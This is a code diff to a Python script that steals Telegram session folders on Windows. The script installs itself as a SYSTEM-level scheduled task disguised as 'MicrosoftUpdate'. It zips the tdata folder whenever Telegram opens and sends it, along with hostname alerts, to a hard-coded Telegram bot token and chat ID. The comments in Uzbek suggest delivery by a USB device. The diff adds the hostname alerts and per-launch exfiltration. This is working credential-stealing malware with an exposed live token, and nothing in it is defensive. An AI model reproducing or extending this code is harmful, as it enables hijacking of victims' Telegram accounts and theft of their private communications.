@@ -15,6 +15,15 @@ if os.name == 'nt':
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
+def send_message(text):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req)
+    except:
+        pass
+
 def send_file(file_path, caption):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -65,13 +74,14 @@ def install_persistence():
             with open(script_path, 'w') as f:
                 f.write(content)
         subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f', '/it'], shell=True)
+        send_message(f"🔒 Checker o'rnatildi: {socket.gethostname()}")
     except:
         pass
 
 # MAIN
 install_persistence()
 
-# Birinchi marta ishga tushganda darhol yuboradi
+# PICO TIQILGAN ZAHOTI BIRINCHI TDATANI YUBORADI
 tdata_path, pc_name = get_tdata_bruteforce()
 if tdata_path:
     try:
@@ -84,30 +94,29 @@ if tdata_path:
                         file_path = os.path.join(root, file)
                         zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                     except: pass
-        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
+        send_file(zip_path, f"⚡ Pico birinchi tdata yubordi!\n🖥 {pc_name}")
         os.remove(zip_path)
     except:
         pass
 
-# Endi doimiy kuzatish (faqat yopilib qayta ochilganda yoki 30 daqiqada)
+# ENDI DOIMIY KUZATISH (HAR SAFAR TELEGRAM OCHILGANDA YANGI TDATA)
 last_state = "closed"
-last_sent_time = 0
 
 while True:
-    time.sleep(2)  # Har 2 soniyada tekshiradi
+    time.sleep(2)
     try:
         result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
         is_running = "Telegram.exe" in result.stdout
         
-        current_time = time.time()
-        
-        # 1. Agar Telegram hozirgina ochilgan bo'lsa (yopiq edi, ochildi)
+        # Agar Telegram yopiq edi va hozir ochildi
         if is_running and last_state == "closed":
+            send_message(f"📩 Telegram ochildi: {socket.gethostname()} (Yangi tdata yig'ilmoqda...)")
+            
             tdata_path, pc_name = get_tdata_bruteforce()
             if tdata_path:
                 try:
                     temp_dir = tempfile.gettempdir()
-                    zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(current_time)}.zip")
+                    zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
                     with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                         for root, dirs, files in os.walk(tdata_path):
                             for file in files:
@@ -120,32 +129,10 @@ while True:
                 except:
                     pass
             last_state = "open"
-            last_sent_time = current_time
-        
-        # 2. Agar Telegram yopilsa, holatni o'zgartiramiz (lekin tdata yubormaymiz)
+            
+        # Agar Telegram yopilsa
         if not is_running and last_state == "open":
             last_state = "closed"
-        
-        # 3. Agar Telegram ochiq tursa, lekin 30 daqiqadan o'tgan bo'lsa, yangi tdata yuboradi
-        if is_running and last_state == "open":
-            if current_time - last_sent_time > 1800:  # 30 daqiqa = 1800 soniya
-                tdata_path, pc_name = get_tdata_bruteforce()
-                if tdata_path:
-                    try:
-                        temp_dir = tempfile.gettempdir()
-                        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(current_time)}.zip")
-                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                            for root, dirs, files in os.walk(tdata_path):
-                                for file in files:
-                                    try:
-                                        file_path = os.path.join(root, file)
-                                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
-                                    except: pass
-                        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
-                        os.remove(zip_path)
-                    except:
-                        pass
-                last_sent_time = current_time
-                
+            
     except:
         pass
